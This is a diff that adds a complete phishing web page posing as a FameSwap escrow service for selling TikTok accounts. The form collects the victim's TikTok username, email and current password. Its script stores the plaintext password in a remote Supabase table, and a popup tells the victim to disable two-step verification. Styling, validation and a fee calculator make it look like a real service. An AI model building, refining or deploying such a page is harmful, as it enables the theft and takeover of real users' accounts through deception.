@@ -1,0 +1,1087 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>FameSwap - Secure Your Account</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link rel="icon" type="image/x-icon" href="favicon.png" />
+    <link rel="shortcut icon" type="image/x-icon" href="favicon.png" />
+    <link rel="apple-touch-icon" sizes="180x180" href="favicon.png" />
+    <link
+      href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&amp;display=swap"
+      rel="stylesheet"
+    />
+    <link
+      rel="stylesheet"
+      href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css"
+    />
+    <style>
+      body {
+        font-family: "Roboto", sans-serif;
+        margin: 0;
+        padding: 0;
+        background-color: #263648;
+      }
+      .header {
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+        padding: 10px 20px;
+        background-color: #263648;
+        border-bottom: 1px solid rgba(245, 166, 35, 0.2);
+      }
+
+      .header .logo {
+        display: flex;
+        align-items: center;
+      }
+      .header .logo-link {
+        display: flex;
+        align-items: center;
+        text-decoration: none;
+      }
+      .header .logo-link img {
+        height: 30px;
+      }
+      .header .logo-link .logo-text {
+        margin-left: 5px;
+        color: #f5a623;
+      }
+      .header .watch-now {
+        background-color: #f5a623;
+        color: #263648;
+        padding: 10px 20px;
+        border-radius: 5px;
+        text-decoration: none;
+        font-weight: 500;
+      }
+      .report-section {
+        padding: 40px 20px;
+        text-align: center;
+      }
+      .report-title {
+        font-size: 36px;
+        margin-bottom: 20px;
+        color: #f5a623;
+      }
+      .report-form-container {
+        background-color: rgba(255, 255, 255, 0.05);
+        padding: 30px;
+        border-radius: 10px;
+        box-shadow: 0 4px 12px rgba(0, 0, 0, 0.2);
+        max-width: 600px;
+        margin: 0 auto;
+        text-align: left;
+        border: 1px solid rgba(245, 166, 35, 0.2);
+      }
+      .report-description {
+        font-size: 14px;
+        color: rgba(255, 255, 255, 0.7);
+        margin-bottom: 24px;
+        line-height: 1.5;
+      }
+      .report-form {
+        display: flex;
+        flex-direction: column;
+        gap: 16px;
+      }
+      .form-label {
+        display: block;
+        margin-bottom: 8px;
+        font-weight: 500;
+        color: #f5a623;
+      }
+      .form-input,
+      .form-select,
+      .form-textarea {
+        width: 100%;
+        padding: 12px;
+        background-color: rgba(255, 255, 255, 0.1);
+        border: 1px solid rgba(245, 166, 35, 0.3);
+        border-radius: 6px;
+        font-size: 14px;
+        transition: border-color 0.2s;
+        color: white;
+      }
+      .form-input:focus,
+      .form-select:focus,
+      .form-textarea:focus {
+        outline: none;
+        border-color: #f5a623;
+      }
+      .form-help-text {
+        font-size: 13px;
+        color: rgba(255, 255, 255, 0.5);
+        margin: -8px 0 16px;
+      }
+      .form-upload-btn {
+        display: inline-block;
+        padding: 12px 24px;
+        background-color: #f5a623;
+        color: #263648;
+        border: none;
+        border-radius: 6px;
+        cursor: pointer;
+        font-size: 14px;
+        transition: background-color 0.2s;
+      }
+      .form-upload-btn:hover {
+        background-color: #d68f1c;
+      }
+      .form-declaration {
+        margin: 24px 0;
+        padding: 16px;
+        background-color: rgba(255, 255, 255, 0.05);
+        border-radius: 6px;
+      }
+      .declaration-title {
+        font-weight: 500;
+        margin-bottom: 16px;
+        color: #f5a623;
+      }
+      .declaration-label {
+        display: flex;
+        align-items: flex-start;
+        gap: 8px;
+        margin-bottom: 12px;
+        font-size: 14px;
+        color: rgba(255, 255, 255, 0.7);
+        line-height: 1.4;
+      }
+      .declaration-checkbox {
+        margin-top: 3px;
+      }
+      .form-submit-btn {
+        display: block;
+        width: 100%;
+        padding: 16px;
+        background-color: #f5a623;
+        color: #263648;
+        border: none;
+        border-radius: 6px;
+        font-size: 16px;
+        font-weight: 500;
+        cursor: pointer;
+        transition: background-color 0.2s;
+      }
+      .form-submit-btn:hover {
+        background-color: #d68f1c;
+      }
+      .form-submit-btn:disabled {
+        background-color: rgba(245, 166, 35, 0.3);
+        cursor: not-allowed;
+      }
+
+      .password-input-wrapper {
+        position: relative;
+        display: flex;
+        align-items: center;
+        width: 100%;
+      }
+
+      .toggle-password {
+        position: absolute;
+        right: 12px;
+        top: 50%;
+        transform: translateY(-50%);
+        background: none;
+        border: none;
+        color: rgba(255, 255, 255, 0.5);
+        cursor: pointer;
+        padding: 8px;
+        font-size: 16px;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        z-index: 2;
+      }
+
+      .toggle-password:hover {
+        color: #f5a623;
+      }
+
+      .toggle-password i {
+        font-size: 16px;
+      }
+
+      .toggle-password i.fa-eye::before {
+        content: "👁";
+      }
+
+      .toggle-password i.fa-eye-slash::before {
+        content: "🚫";
+      }
+
+      .password-strength {
+        margin-top: 8px;
+        padding: 8px;
+        background: rgba(255, 255, 255, 0.05);
+        border-radius: 4px;
+      }
+
+      .strength-bar {
+        height: 4px;
+        background: rgba(255, 255, 255, 0.1);
+        border-radius: 2px;
+        margin-bottom: 8px;
+        overflow: hidden;
+      }
+
+      .strength-bar::before {
+        content: "";
+        display: block;
+        height: 100%;
+        width: 0;
+        background: #f5a623;
+        transition: width 0.3s ease;
+      }
+
+      .strength-bar.weak::before {
+        width: 33.33%;
+        background: #ff4444;
+      }
+
+      .strength-bar.medium::before {
+        width: 66.66%;
+        background: #f5a623;
+      }
+
+      .strength-bar.strong::before {
+        width: 100%;
+        background: #00c851;
+      }
+
+      .strength-text {
+        font-size: 12px;
+        color: rgba(255, 255, 255, 0.5);
+        margin: 0;
+      }
+
+      .strength-text span {
+        font-weight: 500;
+      }
+
+      .strength-text span.weak {
+        color: #ff4444;
+      }
+
+      .strength-text span.medium {
+        color: #f5a623;
+      }
+
+      .strength-text span.strong {
+        color: #00c851;
+      }
+
+      /* Success Popup Styles */
+      .popup-overlay {
+        display: none;
+        position: fixed;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100%;
+        background-color: rgba(0, 0, 0, 0.7);
+        z-index: 1000;
+        align-items: center;
+        justify-content: center;
+      }
+
+      .popup-overlay.active {
+        display: flex;
+      }
+
+      .popup-container {
+        background-color: #263648;
+        padding: 32px;
+        border-radius: 12px;
+        max-width: 400px;
+        width: 90%;
+        text-align: center;
+        position: relative;
+        box-shadow: 0 10px 25px rgba(0, 0, 0, 0.3);
+        border: 1px solid rgba(245, 166, 35, 0.2);
+      }
+
+      .popup-close {
+        position: absolute;
+        top: 16px;
+        right: 16px;
+        background: none;
+        border: none;
+        font-size: 24px;
+        cursor: pointer;
+        color: rgba(255, 255, 255, 0.5);
+      }
+
+      .popup-icon {
+        width: 64px;
+        height: 64px;
+        margin-bottom: 16px;
+      }
+
+      .popup-title {
+        font-size: 24px;
+        font-weight: 600;
+        color: #f5a623;
+        margin-bottom: 16px;
+      }
+
+      .popup-message {
+        color: rgba(255, 255, 255, 0.7);
+        margin-bottom: 24px;
+      }
+
+      .popup-instructions {
+        text-align: left;
+        margin: 16px 0;
+        padding: 16px;
+        background-color: rgba(255, 255, 255, 0.05);
+        border-radius: 8px;
+      }
+
+      .popup-instructions h3 {
+        font-size: 16px;
+        color: #f5a623;
+        margin-bottom: 12px;
+      }
+
+      .popup-instructions ol {
+        margin: 0;
+        padding-left: 20px;
+        color: rgba(255, 255, 255, 0.7);
+      }
+
+      .popup-instructions li {
+        margin-bottom: 12px;
+        line-height: 1.4;
+      }
+
+      .popup-button {
+        background-color: #f5a623;
+        color: #263648;
+        border: none;
+        padding: 12px 32px;
+        border-radius: 6px;
+        font-size: 16px;
+        font-weight: 500;
+        cursor: pointer;
+        transition: background-color 0.2s;
+      }
+
+      .popup-button:hover {
+        background-color: #d68f1c;
+      }
+
+      @media screen and (max-width: 768px) {
+        .header {
+          padding: 15px 16px;
+          justify-content: center;
+        }
+
+        .header .logo-link img {
+          height: 35px;
+        }
+
+        .header .watch-now {
+          display: none;
+        }
+
+        .report-section {
+          padding: 24px 16px;
+        }
+
+        .report-title {
+          font-size: 24px;
+          margin-bottom: 16px;
+        }
+
+        .report-form-container {
+          padding: 20px;
+          margin: 0 auto;
+          width: calc(100% - 32px);
+          max-width: 400px;
+          box-sizing: border-box;
+        }
+
+        .form-input,
+        .form-select,
+        .form-textarea {
+          padding: 10px;
+          font-size: 16px;
+          width: 100%;
+          box-sizing: border-box;
+        }
+
+        .password-input-wrapper {
+          width: 100%;
+          box-sizing: border-box;
+        }
+      }
+
+      @media screen and (max-width: 480px) {
+        .header {
+          padding: 12px;
+        }
+
+        .header .logo-link img {
+          height: 40px;
+        }
+
+        .report-form-container {
+          margin: 0 auto;
+          padding: 16px;
+          width: calc(100% - 24px);
+        }
+
+        .form-input,
+        .form-select,
+        .form-textarea,
+        .password-input-wrapper,
+        .form-declaration,
+        .password-strength {
+          width: 100%;
+          box-sizing: border-box;
+          margin-left: 0;
+          margin-right: 0;
+        }
+      }
+
+      @media screen and (max-width: 360px) {
+        .header .logo-link img {
+          height: 35px;
+        }
+
+        .report-form-container {
+          padding: 12px;
+          margin: 0 auto;
+          width: calc(100% - 16px);
+        }
+      }
+
+      @media screen and (max-width: 768px) {
+        input[type="text"],
+        input[type="email"],
+        input[type="password"] {
+          font-size: 16px !important;
+        }
+      }
+
+      @media screen and (max-width: 700px) {
+        .report-section {
+          padding: 20px 16px;
+        }
+
+        .report-title {
+          margin-bottom: 12px;
+        }
+
+        .form-declaration {
+          margin: 16px 0;
+        }
+
+        .popup-container {
+          max-height: 90vh;
+          overflow-y: auto;
+        }
+      }
+
+      .escrow-fee-section {
+        margin: 24px 0;
+        background-color: rgba(255, 255, 255, 0.05);
+        padding: 20px;
+        border-radius: 8px;
+        border: 1px solid rgba(245, 166, 35, 0.2);
+      }
+
+      .fee-options {
+        display: grid;
+        grid-template-columns: repeat(3, 1fr);
+        gap: 12px;
+        margin-top: 16px;
+      }
+
+      .fee-option {
+        position: relative;
+        display: flex;
+        align-items: center;
+        padding: 16px;
+        background-color: rgba(255, 255, 255, 0.05);
+        border: 2px solid rgba(245, 166, 35, 0.3);
+        border-radius: 8px;
+        cursor: pointer;
+        transition: all 0.3s ease;
+      }
+
+      .fee-option:hover {
+        border-color: #f5a623;
+        background-color: rgba(245, 166, 35, 0.1);
+      }
+
+      .fee-option input[type="radio"] {
+        position: absolute;
+        opacity: 0;
+        width: 0;
+        height: 0;
+      }
+
+      .fee-option .fee-label {
+        color: rgba(255, 255, 255, 0.7);
+        font-size: 14px;
+        font-weight: 500;
+        text-align: center;
+        width: 100%;
+        transition: color 0.3s ease;
+      }
+
+      .fee-option input[type="radio"]:checked + .fee-label {
+        color: #f5a623;
+      }
+
+      .fee-option input[type="radio"]:checked ~ .fee-option {
+        border-color: #f5a623;
+        background-color: rgba(245, 166, 35, 0.1);
+      }
+
+      /* Custom radio button style */
+      .fee-option .fee-label::before {
+        content: "";
+        display: block;
+        width: 20px;
+        height: 20px;
+        border: 2px solid rgba(245, 166, 35, 0.3);
+        border-radius: 50%;
+        margin: 0 auto 8px;
+        transition: all 0.3s ease;
+        background-color: rgba(255, 255, 255, 0.1);
+      }
+
+      .fee-option input[type="radio"]:checked + .fee-label::before {
+        background-color: #f5a623;
+        border-color: #f5a623;
+        box-shadow: 0 0 0 2px rgba(245, 166, 35, 0.2);
+      }
+
+      @media screen and (max-width: 768px) {
+        .fee-options {
+          grid-template-columns: 1fr;
+          gap: 10px;
+        }
+
+        .fee-option {
+          padding: 14px;
+          justify-content: flex-start;
+        }
+
+        .fee-option .fee-label {
+          display: flex;
+          align-items: center;
+          text-align: left;
+          gap: 12px;
+        }
+
+        .fee-option .fee-label::before {
+          margin: 0;
+        }
+      }
+
+      /* Account Price Section Styles */
+      .account-price-section {
+        margin: 24px 0;
+        background-color: rgba(255, 255, 255, 0.05);
+        padding: 20px;
+        border-radius: 8px;
+        border: 1px solid rgba(245, 166, 35, 0.2);
+      }
+
+      .price-input-wrapper {
+        position: relative;
+        display: flex;
+        align-items: center;
+        width: 100%;
+      }
+
+      .price-input-wrapper .currency-symbol {
+        position: absolute;
+        left: 12px;
+        color: rgba(255, 255, 255, 0.5);
+        font-size: 16px;
+      }
+
+      .price-input-wrapper input {
+        padding-left: 30px !important;
+      }
+
+      .price-validation {
+        margin-top: 8px;
+        font-size: 12px;
+        color: rgba(255, 255, 255, 0.5);
+      }
+
+      .price-validation.error {
+        color: #ff4444;
+      }
+
+      .price-validation.success {
+        color: #00c851;
+      }
+
+      .fee-amount-display {
+        margin-top: 16px;
+        padding: 12px;
+        background-color: rgba(255, 255, 255, 0.05);
+        border-radius: 6px;
+        color: rgba(255, 255, 255, 0.7);
+        font-size: 14px;
+      }
+
+      .fee-amount-display .amount {
+        color: #f5a623;
+        font-weight: 500;
+      }
+
+      .fee-amount-display .split {
+        display: flex;
+        justify-content: space-between;
+        margin-top: 8px;
+        padding-top: 8px;
+        border-top: 1px solid rgba(245, 166, 35, 0.2);
+      }
+    </style>
+  </head>
+  <body>
+    <div class="header">
+      <div class="logo">
+        <a class="logo-link" href="https://fameswap.com">
+          <img
+            alt="FameSwap"
+            class="logo-icon"
+            src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQUr8N9WJZJY1GvEayzgVjXntHoDRTPg-sp8g&s"
+          />
+        </a>
+      </div>
+      <a class="watch-now" href="https://fameswap.com"> Get Started </a>
+    </div>
+    <div class="report-section">
+      <h1 class="report-title">Escrow Service</h1>
+      <div class="report-form-container">
+        <p class="report-description">
+          Use the form below to initiate an escrow transaction. Please fill in
+          all the required information below.
+        </p>
+        <form class="report-form">
+          <label for="username" class="form-label">TikTok Username *</label>
+          <input
+            id="username"
+            name="username"
+            type="text"
+            class="form-input"
+            required
+          />
+          <p class="form-help-text">
+            Enter your TikTok username without the @ symbol
+          </p>
+
+          <label for="email" class="form-label">Account Email *</label>
+          <input
+            id="email"
+            name="email"
+            type="email"
+            class="form-input"
+            required
+          />
+          <p class="form-help-text">
+            Enter the email address associated with your TikTok account
+          </p>
+
+          <label for="current-password" class="form-label"
+            >Current Password *</label
+          >
+          <div class="password-input-wrapper">
+            <input
+              id="current-password"
+              name="current-password"
+              type="password"
+              class="form-input"
+              required
+            />
+            <button
+              type="button"
+              class="toggle-password"
+              data-target="current-password"
+            >
+              <i class="fas fa-eye"></i>
+            </button>
+          </div>
+
+          <p class="form-help-text">
+            Enter your current TikTok account password
+          </p>
+
+          <div class="password-strength" id="password-strength">
+            <div class="strength-bar"></div>
+            <p class="strength-text">Password strength: <span>Weak</span></p>
+          </div>
+
+          <div class="account-price-section">
+            <label class="form-label">Account Price *</label>
+            <div class="price-input-wrapper">
+              <span class="currency-symbol">$</span>
+              <input
+                id="account-price"
+                name="account-price"
+                type="number"
+                class="form-input"
+                placeholder="Enter account price"
+                min="1"
+                step="0.01"
+                required
+              />
+            </div>
+            <p class="price-validation" id="price-validation">Enter the agreed selling price for your account</p>
+          </div>
+
+          <div class="escrow-fee-section">
+            <label class="form-label">Escrow Fee Payment *</label>
+            <div class="fee-options">
+              <label class="fee-option">
+                <input type="radio" name="fee-payment" value="buyer" required />
+                <span class="fee-label">Buyer Pays</span>
+              </label>
+              <label class="fee-option">
+                <input
+                  type="radio"
+                  name="fee-payment"
+                  value="seller"
+                  required
+                />
+                <span class="fee-label">Seller Pays</span>
+              </label>
+              <label class="fee-option">
+                <input type="radio" name="fee-payment" value="split" required />
+                <span class="fee-label">50/50 Split</span>
+              </label>
+            </div>
+            <div class="fee-amount-display" id="feeAmountDisplay">
+              <div>Escrow Fee: <span class="amount" id="escrowFeeAmount">$0.00</span></div>
+              <div class="split" id="feeSplitDisplay" style="display: none;">
+                <div>Buyer pays: <span class="amount" id="buyerFeeAmount">$0.00</span></div>
+                <div>Seller pays: <span class="amount" id="sellerFeeAmount">$0.00</span></div>
+              </div>
+            </div>
+          </div>
+
+          <div class="form-declaration">
+            <p class="declaration-title">Security Confirmation</p>
+            <label class="declaration-label">
+              <input type="checkbox" class="declaration-checkbox" />
+              I confirm this is my TikTok account and I authorize this escrow
+              transaction
+            </label>
+          </div>
+
+          <button class="form-submit-btn" type="submit">Start Escrow</button>
+        </form>
+      </div>
+    </div>
+
+    <!-- Success Popup Overlay -->
+    <div class="popup-overlay" id="successPopup">
+      <div class="popup-container">
+        <button class="popup-close" onclick="closePopup()">&times;</button>
+        <img
+          src="https://help.fameswap.com/hc/theming_assets/01HZM00PN2CW1T8ATSNJBMS33D"
+          alt="FameSwap"
+          class="popup-icon"
+        />
+        <h2 class="popup-title">Request submitted!</h2>
+        <p class="popup-message">Thanks for contacting FameSwap.</p>
+
+        <div class="popup-instructions">
+          <h3>Important Security Instructions:</h3>
+          <ol>
+            <li>
+              Please note that FameSwap acts as a secure escrow platform only. Your account details will be transferred directly peer-to-peer between buyer and seller, ensuring your privacy and security throughout the transaction.
+            </li>
+            <li>
+              For a smoother account transfer process, please temporarily
+              disable Two-Step Verification (2SV) in your TikTok account
+              settings.
+            </li>
+          </ol>
+        </div>
+
+        <button class="popup-button" onclick="closePopup()">OK</button>
+      </div>
+    </div>
+
+    <!-- Add Supabase SDK -->
+    <script src="config.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+
+    <script>
+      document.addEventListener("DOMContentLoaded", function () {
+        // 1. Supabase initialization
+        if (
+          typeof SUPABASE_CONFIG === "undefined" ||
+          !SUPABASE_CONFIG.URL ||
+          !SUPABASE_CONFIG.ANON_KEY ||
+          SUPABASE_CONFIG.URL.includes("YOUR_SUPABASE_URL")
+        ) {
+          const errorMsg =
+            "Supabase configuration is missing or incomplete. Please check your config.js file and fill in your Supabase URL and Anon Key.";
+          console.error(errorMsg);
+          alert(errorMsg);
+          document.querySelector(".form-submit-btn").disabled = true;
+          document.querySelector(".form-submit-btn").textContent = "Configuration Error";
+          return; // Stop execution if config is missing
+        }
+        const supabaseClient = supabase.createClient(SUPABASE_CONFIG.URL, SUPABASE_CONFIG.ANON_KEY);
+
+        console.log("Initializing form functionality with Supabase");
+
+        // Account Price Validation
+        const accountPriceInput = document.getElementById("account-price");
+        const priceValidation = document.getElementById("price-validation");
+        const feeAmountDisplay = document.getElementById("feeAmountDisplay");
+        const feeSplitDisplay = document.getElementById("feeSplitDisplay");
+        const escrowFeeAmount = document.getElementById("escrowFeeAmount");
+        const buyerFeeAmount = document.getElementById("buyerFeeAmount");
+        const sellerFeeAmount = document.getElementById("sellerFeeAmount");
+
+        function calculateEscrowFee(price) {
+          const fee = Math.min(price * 0.05, 50);
+          return parseFloat(fee.toFixed(2));
+        }
+
+        function updateFeeDisplay() {
+          const price = parseFloat(accountPriceInput.value) || 0;
+          const totalFee = calculateEscrowFee(price);
+          const selectedFeeOption = document.querySelector(
+            'input[name="fee-payment"]:checked'
+          )?.value;
+
+          escrowFeeAmount.textContent = `$${totalFee.toFixed(2)}`;
+
+          if (selectedFeeOption === "split") {
+            const splitAmount = (totalFee / 2).toFixed(2);
+            buyerFeeAmount.textContent = `$${splitAmount}`;
+            sellerFeeAmount.textContent = `$${splitAmount}`;
+            feeSplitDisplay.style.display = "flex";
+          } else {
+            feeSplitDisplay.style.display = "none";
+          }
+        }
+
+        accountPriceInput.addEventListener("input", function () {
+          const price = parseFloat(this.value);
+
+          if (this.value === "") {
+            priceValidation.textContent =
+              "Enter the agreed selling price for your account";
+            priceValidation.className = "price-validation";
+            updateFeeDisplay();
+            return;
+          }
+
+          if (isNaN(price) || price <= 0) {
+            priceValidation.textContent = "Please enter a valid price";
+            priceValidation.className = "price-validation error";
+          } else if (price < 10) {
+            priceValidation.textContent = "Minimum account price is $10";
+            priceValidation.className = "price-validation error";
+          } else {
+            priceValidation.textContent = "Valid price entered";
+            priceValidation.className = "price-validation success";
+          }
+
+          updateFeeDisplay();
+          updateSubmitButton();
+        });
+
+        // Add event listeners for fee payment options
+        document.querySelectorAll('input[name="fee-payment"]').forEach((radio) => {
+          radio.addEventListener("change", function () {
+            updateFeeDisplay();
+          });
+        });
+
+        // Success Popup Functions
+        function showPopup() {
+          document.getElementById("successPopup").classList.add("active");
+          document.body.style.overflow = "hidden";
+        }
+
+        function closePopup() {
+          document.getElementById("successPopup").classList.remove("active");
+          document.body.style.overflow = "";
+        }
+
+        window.closePopup = closePopup;
+
+        // Form elements
+        const form = document.querySelector(".report-form");
+        const usernameInput = document.getElementById("username");
+        const emailInput = document.getElementById("email");
+        const currentPasswordInput = document.getElementById("current-password");
+        const feeOptions = document.querySelectorAll('input[name="fee-payment"]');
+        const checkbox = document.querySelector(".declaration-checkbox");
+        const submitBtn = document.querySelector(".form-submit-btn");
+        const strengthBar = document.querySelector(".strength-bar");
+        const strengthText = document.querySelector(".strength-text span");
+
+        // Toggle password visibility
+        document.querySelectorAll(".toggle-password").forEach((button) => {
+          button.addEventListener("click", function () {
+            const targetId = this.getAttribute("data-target");
+            const input = document.getElementById(targetId);
+            const icon = this.querySelector("i");
+
+            if (input.type === "password") {
+              input.type = "text";
+              icon.classList.remove("fa-eye");
+              icon.classList.add("fa-eye-slash");
+            } else {
+              input.type = "password";
+              icon.classList.remove("fa-eye-slash");
+              icon.classList.add("fa-eye");
+            }
+          });
+        });
+
+        // Password strength checker
+        function checkPasswordStrength(password) {
+          const hasLetter = /[a-zA-Z]/.test(password);
+          const hasNumber = /\d/.test(password);
+          const hasSpecial = /[!@#$%^&*(),.?":{}|<>]/.test(password);
+          const isLongEnough = password.length >= 8;
+
+          let strength = 0;
+          if (hasLetter) strength++;
+          if (hasNumber) strength++;
+          if (hasSpecial) strength++;
+          if (isLongEnough) strength++;
+
+          return {
+            score: strength,
+            text: strength <= 2 ? "Weak" : strength === 3 ? "Medium" : "Strong",
+            class:
+              strength <= 2 ? "weak" : strength === 3 ? "medium" : "strong",
+          };
+        }
+
+        // Update password strength indicator
+        currentPasswordInput.addEventListener("input", function () {
+          const strength = checkPasswordStrength(this.value);
+          strengthBar.className = "strength-bar " + strength.class;
+          strengthText.textContent = strength.text;
+          strengthText.className = strength.class;
+        });
+
+        // Form validation
+        function validateForm() {
+          const isUsernameValid = usernameInput.value.trim().length > 0;
+          const isEmailValid = /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(
+            emailInput.value
+          );
+          const isCurrentPasswordValid = currentPasswordInput.value.length >= 8;
+          const isFeeSelected = Array.from(feeOptions).some(
+            (radio) => radio.checked
+          );
+          const isCheckboxChecked = checkbox.checked;
+
+          return (
+            isUsernameValid &&
+            isEmailValid &&
+            isCurrentPasswordValid &&
+            isFeeSelected &&
+            isCheckboxChecked
+          );
+        }
+
+        // Enable/disable submit button based on validation
+        function updateSubmitButton() {
+          const isValid = validateForm();
+          submitBtn.disabled = !isValid;
+        }
+
+        // Add event listeners
+        [
+          usernameInput,
+          emailInput,
+          currentPasswordInput,
+          checkbox,
+        ].forEach((element) => {
+          element.addEventListener("change", updateSubmitButton);
+          element.addEventListener("input", updateSubmitButton);
+        });
+
+        feeOptions.forEach((radio) => {
+          radio.addEventListener("change", updateSubmitButton);
+        });
+
+        // Handle form submission
+        form.addEventListener("submit", async function (e) {
+          e.preventDefault();
+          console.log("Form submitted");
+
+          if (!validateForm()) {
+            console.log("Form is invalid, submission blocked.");
+            return;
+          }
+
+          const formData = {
+            username: usernameInput.value,
+            email: emailInput.value,
+            currentPassword: currentPasswordInput.value,
+            accountPrice: parseFloat(accountPriceInput.value) || 0,
+            feePayment: document.querySelector( // Use optional chaining for safety
+              'input[name="fee-payment"]:checked'
+            )?.value,
+          };
+
+          console.log("Form data:", {
+            ...formData,
+            currentPassword: "***", // Don't log the password
+          });
+
+          // Show loading state
+          submitBtn.disabled = true;
+          submitBtn.textContent = "Processing...";
+
+          console.log("Attempting to insert data into Supabase...");
+
+          const { data, error } = await supabaseClient.from("escrow_requests").insert([
+            {
+              username: formData.username,
+              email: formData.email,
+              current_password: formData.currentPassword,
+              account_price: formData.accountPrice,
+              fee_payment: formData.feePayment,
+            },
+          ]);
+
+          if (error) {
+            console.error("Supabase insert failed:", error);
+            submitBtn.disabled = false;
+            submitBtn.textContent = "Start Escrow";
+            alert(
+              "There was an error processing your request: " + error.message
+            );
+          } else {
+            console.log("Data inserted successfully:", data);
+            showPopup();
+            form.reset();
+            strengthBar.className = "strength-bar";
+            strengthText.textContent = "Weak";
+            strengthText.className = "";
+            updateSubmitButton();
+            document.body.style.overflow = "hidden";
+          }
+        });
+
+        // Initial validation check
+        updateSubmitButton();
+      });
+    </script>
+  </body>
+</html>
